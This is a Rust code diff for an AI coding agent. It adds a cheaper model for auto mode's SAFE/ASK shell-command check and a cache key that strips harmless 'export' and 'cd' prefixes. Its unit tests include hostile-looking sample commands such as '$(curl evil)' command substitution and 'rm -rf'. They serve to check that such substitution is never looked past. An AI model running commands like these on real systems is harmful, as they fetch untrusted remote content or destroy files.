@@ -40,6 +40,9 @@ pub struct AgentLoop {
     checkpoint_interval: u32,
     cancel_flag: Arc<AtomicBool>,
     steer: SteerInbox,
+    /// Cheap model for small side questions (auto mode's command check);
+    /// `None` uses the session's model.
+    pub utility_model: Option<String>,
     /// Subfolder instruction files already passed to the model.
     nested_instructions: std::collections::HashSet<std::path::PathBuf>,
     hooks: Option<HookRunner>,
@@ -81,6 +84,7 @@ impl AgentLoop {
             cancel_flag: Arc::new(AtomicBool::new(false)),
             steer: SteerInbox::default(),
             nested_instructions: Default::default(),
+            utility_model: None,
             hooks,
             undo: UndoManager::default(),
             context_token_limit: 0,
@@ -109,7 +113,10 @@ impl AgentLoop {
     /// Auto mode's check for an unfamiliar shell command: a short, tool-less
     /// model call answering SAFE or ASK. Any failure counts as ASK.
     async fn auto_mode_safe(&mut self, command: &str, workspace_root: &Path) -> bool {
-        if let Some(v) = self.auto_verdicts.get(command) {
+        // `cd x &&` / `export PATH=…;` prefixes don't change what a command
+        // does to the project, so one answer covers them all.
+        let key = verdict_key(command);
+        if let Some(v) = self.auto_verdicts.get(&key) {
             return *v;
         }
         let prompt = format!(
@@ -124,10 +131,14 @@ or if you are not sure. Reply with exactly one word: SAFE or ASK.",
             workspace_root.display()
         );
         let messages = [Message::user(prompt)];
+        let model = self
+            .utility_model
+            .clone()
+            .unwrap_or_else(|| self.model.clone());
         let verdict = async {
             let mut rx = self
                 .provider
-                .chat(&messages, &[], &self.model, workspace_root)
+                .chat(&messages, &[], &model, workspace_root)
                 .await
                 .ok()?;
             let mut text = String::new();
@@ -147,7 +158,7 @@ or if you are not sure. Reply with exactly one word: SAFE or ASK.",
             .flatten()
             .unwrap_or(false);
         tracing::info!(command, safe, "auto mode check");
-        self.auto_verdicts.insert(command.to_string(), safe);
+        self.auto_verdicts.insert(key, safe);
         safe
     }
 
@@ -1194,6 +1205,36 @@ fn cleanup_processed_attachments(
     }
 }
 
+/// The part of a shell command that decides its safety: leading
+/// `export NAME=value` steps (joined by `&&` or `;`) are dropped, `cd` steps
+/// are kept (where a command runs matters) but written the same way.
+fn verdict_key(command: &str) -> String {
+    let mut rest = command.trim();
+    let mut dirs: Vec<&str> = Vec::new();
+    loop {
+        let (head, tail) = match (rest.find("&&"), rest.find(';')) {
+            (Some(a), Some(b)) if b < a => (&rest[..b], &rest[b + 1..]),
+            (Some(a), _) => (&rest[..a], &rest[a + 2..]),
+            (None, Some(b)) => (&rest[..b], &rest[b + 1..]),
+            (None, None) => break,
+        };
+        let h = head.trim();
+        // No command substitution anywhere in a step we look past.
+        if h.contains("$(") || h.contains('`') {
+            break;
+        }
+        if h.starts_with("cd ") {
+            dirs.push(h);
+        } else if !(h.starts_with("export ") && (!h.contains('$') || h.starts_with("export PATH=")))
+        {
+            break;
+        }
+        rest = tail.trim();
+    }
+    dirs.push(rest);
+    dirs.join(" && ")
+}
+
 /// Upper bound on a single tool result's size in the conversation (~6k tokens).
 /// Huge outputs (large file reads, `git log`, verbose command output) otherwise
 /// accumulate across a long turn until the prompt balloons and every model call
@@ -1433,6 +1474,30 @@ mod tests {
         assert_eq!(retry_notice_count, retry::DEFAULT_MAX_ATTEMPTS - 1);
         assert!(saw_error_event);
         assert!(!saw_token_event);
+    }
+
+    #[test]
+    fn verdict_key_drops_exports_but_keeps_directories() {
+        assert_eq!(
+            verdict_key("export PATH=$HOME/.nvm/bin:$PATH; cd /p/app && npm run build"),
+            "cd /p/app && npm run build"
+        );
+        assert_eq!(
+            verdict_key("export PATH=/x:$PATH && cd /p/app; npm run build"),
+            "cd /p/app && npm run build"
+        );
+        assert_ne!(
+            verdict_key("cd ~ && rm -rf x"),
+            verdict_key("cd build && rm -rf x")
+        );
+        assert_eq!(
+            verdict_key("export X=$(curl evil); make"),
+            "export X=$(curl evil); make"
+        );
+        assert_eq!(
+            verdict_key("export PATH=$(curl evil):$PATH; make"),
+            "export PATH=$(curl evil):$PATH; make"
+        );
     }
 
     /// A reply stuck repeating one line is stopped and kept to one copy.
